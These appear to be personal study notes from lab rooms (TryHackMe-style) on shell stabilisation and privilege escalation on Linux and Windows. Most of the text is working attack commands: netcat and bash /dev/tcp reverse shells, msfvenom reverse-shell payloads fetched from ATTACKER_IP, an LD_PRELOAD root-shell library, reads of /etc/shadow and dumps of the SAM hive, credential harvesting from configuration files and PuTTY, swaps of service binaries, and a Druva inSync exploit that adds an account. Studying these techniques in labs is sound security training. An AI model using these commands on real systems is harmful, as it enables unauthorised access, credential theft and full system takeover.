# What the Shell 
## Netcat Shell Stabilisation  
### Technique 1: Python  
command:  
```
step 1: python -c 'import pty;pty.spawn("/bin/bash")'  

step 2: export TERM=xterm  

step 3: stty raw -echo; fg  
```
### Technique 2: rlwrap  
command: 
```bash
rlwrap nc -lvnp <port>  #background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell
```
### Technique 3: Socat  

command： 
```bash
sudo python3 -m http.server 80
wget <LOCAL-IP>/socat -O /tmp/socat  //download socat static compiled binary in target 

stty -a //note rows and columns in own terminal 

stty rows number   //set in shell 
stty cols numver   //set in shell 
```
### Socat Encrypted Shells 
### Common Shell Payloads 

a bit of vague***   

command:  
```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   #a bit of hard, but don't worry. try ask chat-gpt

mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
[PayloadAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### practice and example  
command:  
```
remmina  //login to the windows server
```


# Linux Privilege Escalation
[Write-up](https://dev.to/christinec_dev/try-hack-me-linux-privesc-complete-write-up-20fg)

## Enumeration 
### manul
[cut command](https://www.geeksforgeeks.org/cut-command-linux-examples/)  
[2>/dev/null ](https://qr.ae/pKgBo5)  
command:  
```bash
hostname //hostname of the target machine  
uname -a  //kernel information 
cat /proc/version  //proc filesystem kernel
cat /etc/issue  //system information  
ps //running processes 
ps -A //all runing processes 
ps axjf //process tree  
ps aux  //precess for all users
env /environmental variables 
sudo -l //what commands your user can run using sudo 
ls 
ls -l 
ls -la 
id #list general overview of the user's privilege level and group memberships
id <usrname>
cat /etc/passwd  
cat /etc/passwd | cut -d ":" -f 1 
cat /etc/passwd | grep home 
history
ifconfig  
ip route 
netstat -a 
netstat -at 
netstat -au  
netstat -l 
netstat -lt
netstat -s 
netstat -st
netstat -su
netstat -tp 
netstat -ltp   //run in root can complete display
netstat -i //show interface statistics  
netstat -ano //-a display all sockets -n do not resolve names -o display timers

find command 
find . -name flag1.txt //find the file named “flag1.txt” in the current directory
find /home -name flag1.txt //find the file names “flag1.txt” in the /home directory
find / -type d -name config //find the directory named config under “/”
find / -type f -perm 0777 //find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x //find executable files
find /home -user frank //find all files for user “frank” under “/home”
find / -mtime 10 //find files that were modified in the last 10 days
find / -atime 10 //find files that were accessed in the last 10 day
find / -cmin -60 //find files changed within the last hour (60 minutes)
find / -amin -60 //find files accesses within the last hour (60 minutes)
find / -size 50M //find files with a 50 MB size
find / -size +100M  
find / -size +100M -type f 2 2>/dev/null 

find / -writable -type d 2>/dev/null  //Find world-writeable folders
find / -perm -222 -type d 2>/dev/null //Find world-writeable folders
find / -perm -o w -type d 2>/dev/null //Find world-writeable folders
find / -perm -o x -type d 2>/dev/null  //Find world-executable folders

find / -name perl*
find / -name python*
find / -name gcc*

find / -perm -u=s -type f 2>/dev/null  //Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
```

??? how to search file or directory in windows
###  Automated 
1. [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
2. [LinEnum](https://github.com/rebootuser/LinEnum)
3. [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
4. [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) ***
5. [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

##  Privilege Escalation: Kernel Exploits  
step 1: identify the kernel version  
step 2: search public exploit  
step 3: run the exploit   

sources:  
1. google  
2. [linuxkernelcves](https://www.linuxkernelcves.com/cves)
3. [LES](https://github.com/The-Z-Labs/linux-exploit-suggester)

Notes:
1. search specific 
2. before exploit, underestand code
3. some exploits may require further interaction, read comments
4. python server transfer code 

CVE:  
* [CVE-2015-1328](https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/README.md)

## Privilege Escalation: Sudo 
[https://gtfobins.github.io/](https://gtfobins.github.io/)

### Leverage application functions  

[https://gtfobins.github.io/](https://gtfobins.github.io/)
command:   
```bash
cat /etc/shadow  # A shadow password file, also known as /etc/shadow, is a system file in Linux that stores encrypted user passwords and is accessible only to the root user, preventing unauthorized users or malicious actors from breaking into the system. 

sudo apache2 -f /etc/shadow  
sudo nmap -interactive  #do not work   
```
### Leverage LD_PRELOAD 
step 1: Check for LD_PRELOAD (with the env_keep option)  
step 2: Write a simple C code compiled as a share object (.so extension) file  
command:  
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
step 3: Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file  
command:   
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

### Privilege Escalation: SUID  
#### read the /etc/shadow

>[Understanding File Permissions](https://www.elated.com/understanding-permissions/)

command:  [explain](https://chat.openai.com/share/805e4ba0-19e7-4ae2-b118-8004a6cfcecf)
```bash
find / -type f -perm -04000 -ls 2>/dev/null

nano /etc/shadow  
unshadow passwd.txt shadow.txt > passwords.txt
```

#### adding user to /etc/passwd  
command:  [explain](https://chat.openai.com/share/d80cd0f5-a883-4765-b2fc-0d6efdbaeebb)
```bash
openssl passwd -1 -salt THM password1
```

###  Privilege Escalation: Capabilities 
command:  
```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
### Privilege Escalation: Cron Jobs 
command:  
```bash

cat /etc/crontab 

bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

###  Privilege Escalation: PATH   


# Windows Privilege Escalation  

## Harvesting Passwords from Usual Spots 
```xml
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml 

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

command: 
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials

```cmd
cmdkey /list

runas /savecred /user:admin cmd.exe
```

### IIS Configuration
```shell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #a quick way to find database connection strings
```
### Retrieve Credentials from Software: PuTTY 
```shell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

>note: Other software have methods to recover any passwords the user has saved  

##  Other Quick Wins 
### Scheduled Tasks  

command: [explain](https://chat.openai.com/share/099635af-3639-4c36-bead-1015aa2439c3)
```bash
schtasks 
schtasks /query /tn vulntask /fo list /v 

icacls c:\tasks\schtask.bat #check the file permissions on the executable 

 schtasks /run /tn vulntask #manually run task, experimental purpose
```
### AlwaysInstallElevated 
command: 
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  #query 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer #query 2

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.109.20 LPORT=LOCAL_PORT -f msi -o malicious.msi

 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
###  Abusing Service Misconfigurations
#### Windows Services
command:  
```bash
sc qc apphostsvc

```
#### Insecure Permissions on Service Executable

command: 
```cmd
sc qc WindowsScheduler 
icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server 80
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
nc -lvp 4445
sc stop windowsscheduler
sc start windowsscheduler
note: PowerShell sc.exe
```
#### Unquoted Service Paths 
command: 
```cmd
sc qc "disk sorter enterprise"  
icacls c:\MyPrograms 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe 
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F  
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
#### Insecure Service Permissions 

###  Abusing dangerous privileges
[Priv2Admin](https://github.com/gtworek/Priv2Admin)  
[impacket](https://github.com/fortra/impacket)

#### SeBackup / SeRestore  
command: 
```cmd
whoami /priv
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
### Abusing vulnerable software 
#### Unpatched Software 
[plain old Google](https://www.google.com/)

exploit:  
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```


